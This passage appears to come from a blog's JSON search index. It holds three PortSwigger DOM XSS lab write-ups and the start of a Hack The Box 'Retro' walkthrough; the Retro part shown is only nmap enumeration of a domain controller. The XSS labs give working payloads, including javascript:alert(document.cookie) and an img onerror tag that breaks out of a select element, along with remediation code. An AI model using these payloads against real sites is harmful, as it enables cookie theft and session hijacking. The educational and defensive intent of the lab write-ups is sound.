        "title": "DOM XSS Lab 4: jQuery anchor href sink with location.search source",
        "tags": ["WebSecurity","XSS","DOM","JavaScript","jQuery","PortSwigger","web-exploitation","OWASP","security-research",],
        "content": "Lab 4: DOM XSS in jQuery anchor href attribute sink using location.search source: This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library\u0026rsquo;s $ selector function to find an anchor element, and changes its href attribute using data from location.search.\nTo solve this lab, make the \u0026ldquo;back\u0026rdquo; link alert document.cookie.\nInitial Reconnaissance/Discovery: Mapping The Comments Section: Looking at a post we can see we can add comments \u0026amp; leave our name, email \u0026amp; website. Let\u0026rsquo;s enter some random values to see what happens. It\u0026rsquo;s easier to use unique strings that we can easily search for afterwards.\nbl00dst1ll3rComment bl00dst1ll3rName bl00dst1ll3r@example.com http://bl00dst1ll3r.com After submitting the details to the page we can see that our name is hyprlinked \u0026amp; if we click it, it will take us to the website we entered.\nLooking at the page source code we can see our website is linked using an href. Looking at the form data further down we can see the name of the element is \u0026ldquo;website\u0026rdquo;.\n\u0026lt;h2\u0026gt;Leave a comment\u0026lt;/h2\u0026gt; \u0026lt;form action=\u0026#34;/post/comment\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;application/x-www-form-urlencoded\u0026#34;\u0026gt; \u0026lt;input required type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf\u0026#34; value=\u0026#34;Ijn8GzRnLsaDRH0QbXuZmyFcALK99Y1i\u0026#34;\u0026gt; \u0026lt;input required type=\u0026#34;hidden\u0026#34; name=\u0026#34;postId\u0026#34; value=\u0026#34;2\u0026#34;\u0026gt; \u0026lt;label\u0026gt;Comment:\u0026lt;/label\u0026gt; \u0026lt;textarea required rows=\u0026#34;12\u0026#34; cols=\u0026#34;300\u0026#34; name=\u0026#34;comment\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;label\u0026gt;Name:\u0026lt;/label\u0026gt; \u0026lt;input required type=\u0026#34;text\u0026#34; name=\u0026#34;name\u0026#34;\u0026gt; \u0026lt;label\u0026gt;Email:\u0026lt;/label\u0026gt; \u0026lt;input required type=\u0026#34;email\u0026#34; name=\u0026#34;email\u0026#34;\u0026gt; \u0026lt;label\u0026gt;Website:\u0026lt;/label\u0026gt; \u0026lt;input pattern=\u0026#34;(http:|https:).+\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;website\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;button\u0026#34; type=\u0026#34;submit\u0026#34;\u0026gt;Post Comment\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;div class=\u0026#34;is-linkback\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;/\u0026#34;\u0026gt;Back to Blog\u0026lt;/a\u0026gt; However if we look at the rest of the source code and look for javascript between \u0026lt;script\u0026gt; tags there is none other that the labHeader.js which is not tied to this so looks like a dead-end.\nMapping Submit Feedback: Let\u0026rsquo;s map the \u0026ldquo;Submit Feedback page\u0026rdquo;\nMapping The Submit Feedback form: Again we will enter some unique text.\nbl00dst1ll3rName bl00dst1ll3r@example.com bl00dst1ll3rSubject bl00dst1ll3rMessage Once we hit \u0026ldquo;Submit Feedback\u0026rdquo; we see the below message. If we open the dev tools and perform a search for our unique strings we can see we do not get any hits back which means our input is not being stored directly on the page. Mapping The \u0026lt; Back Button: We can see there is a \u0026lt; Back button at the bottom of the page. Inspecting the page we can see the backlink button\u0026rsquo;s code. It\u0026rsquo;s using a standard href with a forward slash to signify the domain root. \u0026lt;a id=\u0026#34;backLink\u0026#34; href=\u0026#34;/\u0026#34;\u0026gt;Back\u0026lt;/a\u0026gt; Looking further down we can see the code that is responsible for this. We will analyze the source code now, however before we do so we need to understand a few things about jQuery and it\u0026rsquo;s syntax.\nFirst A Note On jQuery And $() Functions: If you are unfamiliar with jQuery, $ is jQuery\u0026rsquo;s main function, it\u0026rsquo;s essentially just an alias that jQuery chose to use for calling jQuery\nWhich means these are exactly the same:\n$(\u0026#39;#backLink\u0026#39;) // Short version jQuery(\u0026#39;#backLink\u0026#39;) // Long version - does the exact same thing! So if we see $() in JavaScript it\u0026rsquo;s pretty strong indicator that jQuery is being used like 95% of the time we\u0026rsquo;ll be right, but for the other 5% here\u0026rsquo;s the catch:\nOther Possibilities When We See $(): Other libraries: A few older JavaScript libraries also used $:\nPrototype.js Cash (a lightweight jQuery alternative) +Note+: I\u0026rsquo;m sure there are most likely others however these are the ones I know of.\nCustom code: Someone could theoretically create their own $ function:\nfunction $(id) { return document.getElementById(id); } How To Know For Sure If jQuery Is Being Used: There are a few easy ways we can check if jQuery is being used.\nSearch The Code For jQuery: The simplest way is to use devtools \u0026amp; search the source code for the string \u0026ldquo;jQuery\u0026rdquo;. In the case of this labe can see there is a direct reference to the file jquery_1-8-2.js that is being called by the application, so that is a dead giveaway. Search For jQuery-specific Methods: We can also search for jQuery specific methods being used like .attr(), .addClass(), .fadeIn(), etc.\nA full list of DOM manipulation methods can be found here at jQuery\u0026rsquo;s API documentation https://api.jquery.com/category/manipulation/ The Biggest jQuery Give-Away $(document).ready(): Again we need to get into the weeds a little to explain this but it will payoff, I promise.\nWhat Is $(document).ready() In jQuery? When a webpage loads, the browser reads the HTML from top to bottom. If the JavaScript tries to manipulate an element before it exists, it will fail. \u0026ldquo;Document ready\u0026rdquo; means \u0026ldquo;wait until all the HTML is loaded, THEN run this code.\u0026rdquo;\nSo when $() is called, jQuery looks at what is inside the parentheses and behaves differently based on the content:\nIf we pass a string like \u0026quot;#backLink\u0026quot; jQuery will find the elements in the HTML that matches the string.\n$(\u0026#39;#backLink\u0026#39;) // jQuery finds elements matching this selector However if a function is passed (like in this case) jQuery knows to only execute the code once all the code is loaded and the DOM is ready.\n$(function() { ... }) // jQuery says \u0026#34;oh, run this when the DOM is ready\u0026#34; This is where \u0026ldquo;document ready\u0026rdquo; comes from so the jQuery code only runs once the whole document is ready….see.\n+Note+: There\u0026rsquo;s nothing \u0026ldquo;magical\u0026rdquo; about passing a function javascript that automatically means \u0026ldquo;wait for the page.\u0026rdquo; jQuery\u0026rsquo;s creators simply decided: \u0026ldquo;When someone passes us a function, we\u0026rsquo;ll assume they want it to run when the page is ready.\u0026rdquo; It\u0026rsquo;s a convention that jQuery created, a shortcut they built into their library to make developers\u0026rsquo; lives easier!\nYou can also checkout jQuery\u0026rsquo;s documentation here https://learn.jquery.com/using-jquery-core/document-ready/ Recognizing $(document).ready(): So now we know that we can use it to recognize when jQuery is being used.\nIt\u0026rsquo;s jQuery-specific syntax This exact pattern only works if jQuery is loaded. +Remember+: Vanilla JavaScript doesn\u0026rsquo;t understand $(function() {...}).\nThe longer jQuery version is: This can sometimes be used\n$(document).ready(function() { // code here }); But remember the $(function() {...}) is just the shortcut version of the above!\nHere is the vanilla JavaScript equivalent: Without jQuery, you\u0026rsquo;d write:\ndocument.addEventListener(\u0026#39;DOMContentLoaded\u0026#39;, function() { // code here }); So remember if you see $(function() { ... }) at the start of code, it\u0026rsquo;s definitely jQuery. No other library uses this exact pattern. It\u0026rsquo;s one of jQuery\u0026rsquo;s most recognizable signatures, essentially it\u0026rsquo;s fingerprint!\nIf you see $() in JavaScript code, assume it\u0026rsquo;s jQuery - that\u0026rsquo;s the safest bet. But if something seems off or isn\u0026rsquo;t working as expected, double-check that jQuery is actually loaded on the page.\nIn modern JavaScript (without jQuery), you\u0026rsquo;d typically see document.querySelector() or document.getElementById() instead.\nAnalyzing the Source Code/Behavior: So now we have a good grounding in jQuery let\u0026rsquo;s break down the code.\nDeclaring $( document ).ready() Function: $(function() { $(\u0026#39;#backLink\u0026#39;).attr(\u0026#34;href\u0026#34;, (new URLSearchParams(window.location.search)).get(\u0026#39;returnPath\u0026#39;)); }); As we saw when we see the pattern $(function() { [code] }); we know that is jQuery\u0026rsquo;s $(document).ready() code being used.\nThis means we know that whatever is contained within this function will run after the whole DOM is loaded.\nPass The Value Of #backLink As A Parameter: $(\u0026#39;#backLink\u0026#39;).attr(\u0026#34;href\u0026#34;, (new URLSearchParams(window.location.search)).get(\u0026#39;returnPath\u0026#39;)); $('#backLink') again the shorthand for jQuery is being used $() so the first part of this is saying find the element #backLink on the page.\n+Note+: When we see # that\u0026rsquo;s basically saying \u0026ldquo;find me the element with this ID\u0026rdquo; We are now going set the href (link) .attr(\u0026quot;href\u0026quot;, of the backLink element.\n(new URLSearchParams(window.location.search)).get('returnPath')) this reads the URL parameters on the current page and looks for the parameter returnPath \u0026amp; extracts the value from it. For example if the URL is example.com/page.html?returnPath=/home, this extracts /home\n+In Plain English+: This code finds the backLink element on the page (which is what is executed when we click the \u0026gt;Back button). It then extracts the value from the returnPath parameter in the URL and sets the href (link) of the \u0026gt;Back button to this value. Essentially mapping where the user came from so they can easily go back to the previous page.\nExploitation: Passing A Malicious JavaScript URL: The pre-amble to the lab itself actually gives us the correct payload to exploit this vulnerability. Saying we can pass a malicious JavaScript URL however the lab specifies it want\u0026rsquo;s us to trigger document.cookie.\nSteps:\nWe will modify their existing payload of javascript:alert(document.domain) to be document.cookie Final Payload: javascript:alert(document.cookie) Now we pass it as the value to the returnPath parameter in the URL: returnPath=javascript:alert(document.cookie) Result: Then we hit enter and solve the lab: Why This Is Vulnerable: Primary Issue: The code creates a DOM-based XSS vulnerability by taking untrusted user input from the URL parameter (returnPath) and directly assigning it to the href attribute without any validation or sanitization.\nSpecific Vulnerabilities: No Input Validation: The code blindly trusts whatever value is in the returnPath parameter. There\u0026rsquo;s no check to ensure it\u0026rsquo;s a valid, safe URL.\njavascript: Protocol Execution: When a javascript: URL is set as an href value, clicking that link executes the JavaScript code in the current page\u0026rsquo;s context. This gives an attacker access to:\nSession tokens and cookies (document.cookie) Ability to modify the DOM Ability to make requests on behalf of the user Access to any sensitive data on the page Client-Side Trust Boundary Violation: The application assumes URL parameters are safe, but they\u0026rsquo;re completely attacker-controlled (source). Any user (or attacker) can craft a malicious URL and send it to victims.\nAttack Vector: An attacker can send a victim a link like: https://victim-site.com/page?returnPath=javascript:alert(document.cookie) When the victim loads this page and clicks \u0026ldquo;Back\u0026rdquo;, their browser executes the attacker\u0026rsquo;s JavaScript.\nPotential Fixes: +Disclaimer+, I am not a coder! I would always recommend you read OWASP DOM XSS Prevention Cheat Sheet over me and also follow security principle best practices.\nNever trust user input. All data from URL parameters, form inputs, or any user-controlled source should be treated as potentially malicious. According to OWASP, DOM-based XSS occurs when \u0026ldquo;the application contains client-side code that processes data from an untrusted source in an unsafe way, usually by writing the data back to the DOM.\u0026rdquo;\nValidate and sanitize on input, encode on output. For URLs specifically:\nValidate that the URL matches expected patterns (allowlist approach) Never allow javascript:, data:, or vbscript: protocols in href attributes Consider using relative URLs only when possible Always have a safe default fallback Remediation Options: Again a further +disclaimer+, I am not a coder/programmer.\nOption 1: URL Allowlist: Only allow specific, known-safe return paths:\n$(function() { const returnPath = (new URLSearchParams(window.location.search)).get(\u0026#39;returnPath\u0026#39;); // Allowlist of valid paths const allowedPaths = [\u0026#39;/home\u0026#39;, \u0026#39;/products\u0026#39;, \u0026#39;/about\u0026#39;, \u0026#39;/contact\u0026#39;]; if (allowedPaths.includes(returnPath)) { $(\u0026#39;#backLink\u0026#39;).attr(\u0026#34;href\u0026#34;, returnPath); } else { // Default safe fallback $(\u0026#39;#backLink\u0026#39;).attr(\u0026#34;href\u0026#34;, \u0026#39;/home\u0026#39;); } }); Option 2: URL Validation: Validate that the URL is a safe, relative path:\n$(function() { const returnPath = (new URLSearchParams(window.location.search)).get(\u0026#39;returnPath\u0026#39;); // Only allow relative URLs starting with \u0026#39;/\u0026#39; // This blocks javascript:, data:, http://, etc. if (returnPath \u0026amp;\u0026amp; returnPath.startsWith(\u0026#39;/\u0026#39;) \u0026amp;\u0026amp; !returnPath.startsWith(\u0026#39;//\u0026#39;)) { $(\u0026#39;#backLink\u0026#39;).attr(\u0026#34;href\u0026#34;, returnPath); } else { $(\u0026#39;#backLink\u0026#39;).attr(\u0026#34;href\u0026#34;, \u0026#39;/home\u0026#39;); } }); Option 3: Use URL API for Validation\n$(function() { const returnPath = (new URLSearchParams(window.location.search)).get(\u0026#39;returnPath\u0026#39;); try { const url = new URL(returnPath, window.location.origin); // Only allow same-origin URLs if (url.origin === window.location.origin) { $(\u0026#39;#backLink\u0026#39;).attr(\u0026#34;href\u0026#34;, url.pathname + url.search); } else { $(\u0026#39;#backLink\u0026#39;).attr(\u0026#34;href\u0026#34;, \u0026#39;/home\u0026#39;); } } catch (e) { // Invalid URL $(\u0026#39;#backLink\u0026#39;).attr(\u0026#34;href\u0026#34;, \u0026#39;/home\u0026#39;); } }); ", 
        "url": "http:\/\/localhost:1313\/portswigger\/dom_xss_lab_4\/"
    },
    
    "http:\/\/localhost:1313\/portswigger\/dom_xss_lab_3\/": {
        "title": "DOM XSS Lab 3: Exploiting innerHTML with location.search in the Search Message",
        "tags": ["WebSecurity","XSS","DOM","JavaScript","PortSwigger","web-exploitation","OWASP","security-research",],
        "content": "Lab 3: DOM XSS in innerHTML sink using source location.search This lab contains a DOM-based cross-site scripting vulnerability in the blog search. It takes data from location.search and writes it into the page via innerHTML.\nTo solve the lab, perform a cross-site scripting attack that calls alert.\nPre-amble, before the link to the lab. There is this text below, which tells essentially what we need to do and what will or won\u0026rsquo;t work.\nThe innerHTML sink doesn\u0026rsquo;t execute \u0026lt;script\u0026gt; in modern browsers, and svg onload won’t fire here. Use alternative elements like img or iframe with event handlers (e.g., onerror, onload).\nExample: element.innerHTML='... \u0026lt;img src=1 onerror=alert(document.domain)\u0026gt; ...'\nInitial Reconnaissance / Discovery: Logging onto the blog we can see there is a search function at the top of the page. Let\u0026rsquo;s enter a unique string bl00dsti113r and observe the results.\nWe can see our search string is being directly passed as a paramter in the url /?search=bl00dsti113r\nIn DevTools, we see the value is written once into the page under the element with id searchMessage. Analyzing the Source Code / Behavior: Let\u0026rsquo;s take a look at the source code and see what is happening.\n\u0026lt;script\u0026gt; function doSearchQuery(query) { document.getElementById(\u0026#39;searchMessage\u0026#39;).innerHTML = query; } var query = (new URLSearchParams(window.location.search)).get(\u0026#39;search\u0026#39;); if (query) { doSearchQuery(query); } \u0026lt;/script\u0026gt; doSearchQuery Function function doSearchQuery(query) { document.getElementById(\u0026#39;searchMessage\u0026#39;).innerHTML = query; } This finds the element with id searchMessage and sets its innerHTML to whatever value query contains.\n+In simple terms+: It replaces the contents of searchMessage with the value of query as HTML.\nIf we look further up the page we can see the target element searchMessage on the page. Query Variable var query = (new URLSearchParams(window.location.search)).get(\u0026#39;search\u0026#39;); URLSearchParams reads the page’s query string (window.location.search).\n.get('search') extracts the value of the search parameter (what we type into the search box).\nThis is the HTML for the search box. The input’s name is search, and the form uses GET, so your text is sent as a query parameter ?search=....\n\u0026lt;section class=search\u0026gt; \u0026lt;form action=/ method=GET\u0026gt; \u0026lt;input type=text placeholder=\u0026#39;Search the blog...\u0026#39; name=search\u0026gt; \u0026lt;button type=submit class=button\u0026gt;Search\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/section\u0026gt; +In simple terms+: Whatever we type in the search box goes into the URL as ?search=... and is stored in query.\nRunning the Function if (query) { doSearchQuery(query); } If query has a value, the page writes it into searchMessage via innerHTML.\nSummary: Where the data comes from (Source) and where it goes (Sink) Source (attacker-controlled): The value in the page URL, e.g. ?search=... Read by: URLSearchParams(window.location.search).get('search') → stored in query Sink (dangerous write): document.getElementById('searchMessage').innerHTML = query +In plain English+: Whatever we type into the search box ends up in the URL, gets read into query, and is then inserted into the page as HTML. Because it isn’t encoded or sanitized, the browser can treat our input like code. That’s DOM XSS.\nFlow: URL ?search=... → query → innerHTML(#searchMessage) ⇒ code can run\nExploitation: Because innerHTML is used with untrusted (unsanitized) input, we can inject an element with an event handler.\nSteps:\nUse an element that can fire handlers when it fails, in this case we will use \u0026lt;img ... onerror=...\u0026gt;. Now we force an error by specifying a fake src image so that the error triggers: \u0026lt;img src=1 onerror= Now we specify an alert should be triggered in the event of an error alert(1). Final Payload : \u0026lt;img src=1 onerror=alert(1)\u0026gt; Place it in the URL parameter (URL-encode if needed, in this case it is not needed): /?search=%3Cimg%20src%3D1%20onerror%3Dalert(1)%3E\nResult: the alert fires and the lab is solved. After dismissing the alert, you’ll see the broken image indicator because the file doesn’t exist. Why This Is Vulnerable: Primary issue: Untrusted input from location.search is inserted into the DOM via innerHTML without encoding/sanitization.\nHow to Fix (Safer Patterns): How To Fix: OWASPS Guidelines on making dynamic updates to the DOM recommend:\nRULE #1 - HTML Escape then JavaScript Escape Before Inserting Untrusted Data into HTML Subcontext within the Execution Context\nThere are several methods and attributes which can be used to directly render HTML content within JavaScript. These methods constitute the HTML Subcontext within the Execution Context. If these methods are provided with untrusted input, then an XSS vulnerability could result.\nHTML encoding \u0026amp; also JavaScript encoding all untrusted input.\nGuidelines Taken from OWASP :\n//Dangerous element.innerHTML = \u0026#34;\u0026lt;HTML\u0026gt; Tags and markup\u0026#34;; //Safer with User Input being encoded var ESAPI = require(\u0026#39;node-esapi\u0026#39;); element.innerHTML = \u0026#34;\u0026lt;%=ESAPI.encoder().encodeForJavascript(ESAPI.encoder().encodeForHTML(untrustedData))%\u0026gt;\u0026#34;; For general other guidance, see OWASP’s DOM-based XSS Prevention Cheat Sheet:\nhttps://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html ", 
        "url": "http:\/\/localhost:1313\/portswigger\/dom_xss_lab_3\/"

    "http:\/\/localhost:1313\/portswigger\/dom_xss_lab_2\/": {
        "title": "DOM XSS Lab 2: Exploiting document.write with location.search in Select Elements",
        "tags": ["WebSecurity","XSS","DOM","JavaScript","document.write","location.search","client-side","injection","DOM-based","bug-bounty","web-exploitation","OWASP","security-research",],
        "content": "Lab 2: DOM XSS in document.write sink using source location.search inside a \u0026lt;select\u0026gt; element: This lab contains a DOM-based cross-site scripting vulnerability in the stock checker. It uses the JavaScript document.write function, which writes raw HTML into the page. The function is called with data from location.search (the URL query string), which you control. The data is inserted inside a \u0026lt;select\u0026gt; element.\nTo solve this lab, perform a cross-site scripting attack that breaks out of the \u0026lt;select\u0026gt; element and calls alert.\nFinding an interesting parameter: When we filter for store location, the application uses the query parameter storeId. We should now locate where this parameter is processed in the page’s JavaScript.\nBreaking Down The Source Code: Searching the page, we find storeId used in the stockCheckForm code: \u0026lt;form id=\u0026#34;stockCheckForm\u0026#34; action=\u0026#34;/product/stock\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input required type=\u0026#34;hidden\u0026#34; name=\u0026#34;productId\u0026#34; value=\u0026#34;1\u0026#34;\u0026gt; \u0026lt;script\u0026gt; var stores = [\u0026#34;London\u0026#34;,\u0026#34;Paris\u0026#34;,\u0026#34;Milan\u0026#34;]; var store = (new URLSearchParams(window.location.search)).get(\u0026#39;storeId\u0026#39;); document.write(\u0026#39;\u0026lt;select name=\u0026#34;storeId\u0026#34;\u0026gt;\u0026#39;); if (store) { document.write(\u0026#39;\u0026lt;option selected\u0026gt;\u0026#39; + store + \u0026#39;\u0026lt;/option\u0026gt;\u0026#39;); } for (var i = 0; i \u0026lt; stores.length; i++) { if (stores[i] === store) continue; document.write(\u0026#39;\u0026lt;option\u0026gt;\u0026#39; + stores[i] + \u0026#39;\u0026lt;/option\u0026gt;\u0026#39;); } document.write(\u0026#39;\u0026lt;/select\u0026gt;\u0026#39;); \u0026lt;/script\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;button\u0026#34;\u0026gt;Check stock\u0026lt;/button\u0026gt; Form metadata: \u0026lt;form id=\u0026#34;stockCheckForm\u0026#34; action=\u0026#34;/product/stock\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input required type=\u0026#34;hidden\u0026#34; name=\u0026#34;productId\u0026#34; value=\u0026#34;1\u0026#34;\u0026gt; The form posts to /product/stock and includes a hidden productId=1.\n+Note+: This productId is unrelated to the store names; it’s just the product identifier.\nThe rest of the logic is inside the \u0026lt;script\u0026gt; block.\nPredefined options: var stores = [\u0026#34;London\u0026#34;,\u0026#34;Paris\u0026#34;,\u0026#34;Milan\u0026#34;]; These are the allowed store options shown in the dropdown menu.\nUser-controlled source: var store = (new URLSearchParams(window.location.search)).get(\u0026#39;storeId\u0026#39;); document.write(\u0026#39;\u0026lt;select name=\u0026#34;storeId\u0026#34;\u0026gt;\u0026#39;); URLSearchParams looks at the page’s query string (that’s window.location.search).\n.get('storeId') pulls out whatever value is set for the storeId parameter.\nThe script then writes that value directly into the page with document.write, no escaping or checks, so this means injected HTML/JS can run.\nWriting to the DOM: if (store) { document.write(\u0026#39;\u0026lt;option selected\u0026gt;\u0026#39; + store + \u0026#39;\u0026lt;/option\u0026gt;\u0026#39;); } for (var i = 0; i \u0026lt; stores.length; i++) { if (stores[i] === store) continue; document.write(\u0026#39;\u0026lt;option\u0026gt;\u0026#39; + stores[i] + \u0026#39;\u0026lt;/option\u0026gt;\u0026#39;); } document.write(\u0026#39;\u0026lt;/select\u0026gt;\u0026#39;); If store has a value, the script writes it into the dropdown as the selected \u0026lt;option\u0026gt; using document.write.\nNext, it adds the built-in stores (London, Paris, Milan) as more \u0026lt;option\u0026gt;s, skipping any that === match the value of store.\nSince store comes straight from the URL and is written as raw HTML (no encoding), an attacker can inject HTML/JS.\nExploitation PoC: Because storeId isn’t sanitized, we can inject our own HTML into the \u0026lt;select\u0026gt;.\nTo prove it’s controllable, first try a harmless value (e.g., \u0026amp;storeId=bl00dstI113r).\nResult in the DOM (sanity check): Rendered HTML fragment:\n\u0026lt;select name=\u0026#34;storeId\u0026#34;\u0026gt; \u0026lt;option selected\u0026gt;bl00dstI113r\u0026lt;/option\u0026gt; \u0026lt;option\u0026gt;London\u0026lt;/option\u0026gt; \u0026lt;option\u0026gt;Paris\u0026lt;/option\u0026gt; \u0026lt;option\u0026gt;Milan\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; This is DOM-based XSS because the *source is location.search (URL input) and the sink is document.write (HTML output).\nThe server doesn’t echo our payload. Instead, the browser’s JavaScript takes our URL value and builds the HTML itself, so the attack happens entirely in the DOM.\nExploitation: triggering an alert We need to break out of the \u0026lt;option\u0026gt;/\u0026lt;select\u0026gt; context and inject our own element with a JavaScript event, because otherwise the payload stays inside the option’s text, gets treated as plain text (not HTML), and no event handlers or scripts will execute.\nThe selected option is built as:\n'\u0026lt;option selected\u0026gt;' + store + '\u0026lt;/option\u0026gt;' If we supply a payload that closes the current tags and then adds an element with an event handler, we can execute JavaScript.\nSteps:\nClose the current text context by passing a double quote and angle bracket: \u0026quot;\u0026gt; Close the \u0026lt;select\u0026gt;: \u0026quot;\u0026gt;\u0026lt;/select\u0026gt; Inject an element with an event handler. A classic is an image that triggers on error: \u0026lt;img src=1 onerror=alert(1)\u0026gt; This works as we are calling an image which does not exist and in the event of an error (which will happen) we will alert to the page. Combined payload: \u0026quot;\u0026gt;\u0026lt;/select\u0026gt;\u0026lt;img src=1 onerror=alert(1)\u0026gt; URL-encode spaces if needed (%20) → \u0026quot;\u0026gt;\u0026lt;/select\u0026gt;\u0026lt;img%20src=1%20onerror=alert(1)\u0026gt; Final PoC (as storeId):\nstoreId=\u0026quot;\u0026gt;\u0026lt;/select\u0026gt;\u0026lt;img%20src=1%20onerror=alert(1)\u0026gt; Result: Injected HTML (simplified view):\n\u0026lt;select name=\u0026#34;storeId\u0026#34;\u0026gt; \u0026lt;option selected\u0026gt;\u0026#34;\u0026gt;\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;img src=\u0026#34;1\u0026#34; onerror=\u0026#34;alert(1)\u0026#34;\u0026gt; \u0026lt;option\u0026gt;London\u0026lt;/option\u0026gt; \u0026lt;option\u0026gt;Paris\u0026lt;/option\u0026gt; \u0026lt;option\u0026gt;Milan\u0026lt;/option\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;button\u0026#34;\u0026gt;Check stock\u0026lt;/button\u0026gt; Why This Is Vulnerable: Primary Issue: Untrusted data from location.search (storeId parameter) is inserted into HTML using document.write (store variable) without encoding.\nHow To Fix: Don’t use document.write for dynamic content. Instead use safer DOM APIs (createElement, textContent, appendChild).\nIf document.write must be used see mozilla\u0026rsquo;s advisory below. However it is advised to not use it. I would also recommend reading OWASP DOM based XSS Prevention Cheat Sheet The method is a possible vector for Cross-site-scripting (XSS) attacks, where potentially unsafe strings provided by a user are injected into the DOM without first being sanitized. While the method may block \u0026lt;script\u0026gt; elements from executing when they are injected in some browsers (see Intervening against document.write() for Chrome) , it is susceptible to many other ways that attackers can craft HTML to run malicious JavaScript.\nYou can mitigate these issues by always passing TrustedHTML objects instead of strings, and enforcing trusted type using the require-trusted-types-for CSP directive. This ensures that the input is passed through a transformation function, which has the chance to sanitize the input to remove potentially dangerous markup (such as \u0026lt;script\u0026gt; elements and event handler attributes), before it is injected.\n", 
        "url": "http:\/\/localhost:1313\/portswigger\/dom_xss_lab_2\/"
    },

        "title": "Retro HTB Walkthrough: Pre-Win2000 Machine Accounts, LDAP Bitmasks \u0026 ESC1 Cert Abuse",
        "tags": ["Windows","HTB","Hack The Box","Active Directory","Domain Controller","LDAP","Kerberos","SMB","BloodHound","Certipy","ESC1","Certificate Template","UserAccountControl","Pre-Windows 2000","Machine Account","Impacket","AS-REP Roasting","Kerbrute","Privilege Escalation",],
        "content": "Retro Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Retro How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walkthroughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: TCP:\n#Command nmap $box -Pn -oA TCPbasicScan #Results Nmap scan report for 10.129.234.44 Host is up (0.034s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 3389/tcp open ms-wbt-server Initial thoughts: Looks to be a domain controller as we have DNS (53) kerberos (88) \u0026amp; ldap (389, 636, 3268 \u0026amp; 3269) running plus SMB \u0026amp; rdp (3389) Comprehensive Scans: #Command sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP #Results Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-14 07:52 BST Nmap scan report for 10.129.234.44 Host is up (0.023s latency). Not shown: 65515 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-09-14 06:54:50Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC.retro.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:DC.retro.vl | Not valid before: 2024-10-02T10:33:09 |_Not valid after: 2025-10-02T10:33:09 |_ssl-date: TLS randomness does not represent time 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC.retro.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:DC.retro.vl | Not valid before: 2024-10-02T10:33:09 |_Not valid after: 2025-10-02T10:33:09 |_ssl-date: TLS randomness does not represent time 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=DC.retro.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:DC.retro.vl | Not valid before: 2024-10-02T10:33:09 |_Not valid after: 2025-10-02T10:33:09 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=DC.retro.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:DC.retro.vl | Not valid before: 2024-10-02T10:33:09 |_Not valid after: 2025-10-02T10:33:09 3389/tcp open ms-wbt-server Microsoft Terminal Services |_ssl-date: 2025-09-14T06:56:22+00:00; 0s from scanner time. | rdp-ntlm-info: | Target_Name: RETRO | NetBIOS_Domain_Name: RETRO | NetBIOS_Computer_Name: DC | DNS_Domain_Name: retro.vl | DNS_Computer_Name: DC.retro.vl | Product_Version: 10.0.20348 |_ System_Time: 2025-09-14T06:55:42+00:00 | ssl-cert: Subject: commonName=DC.retro.vl 